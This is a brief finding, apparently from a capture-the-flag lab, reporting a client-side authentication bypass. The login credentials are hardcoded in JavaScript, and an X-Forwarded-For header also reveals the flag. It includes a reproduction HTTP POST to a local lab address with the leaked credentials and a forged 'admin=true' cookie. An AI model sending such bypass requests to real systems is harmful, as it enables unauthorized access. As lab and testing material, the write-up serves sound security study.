findings.title: Client-Side Authentication Bypass - Flag Captured
findings.description: The login form relies on client-side JavaScript for credential validation (admin/sup3rsecr3t hardcoded in JS). The server-side PHP processes the POST request regardless of the JS check, allowing authentication bypass by sending a direct POST with valid credentials. Additionally, the X-Forwarded-For header also triggered the flag display.

reproduction.command:
POST /index.php HTTP/1.1
Host: 172.17.0.1:45625
Content-Type: application/x-www-form-urlencoded
Cookie: admin=true

username=admin&password=sup3rsecr3t&login=Login
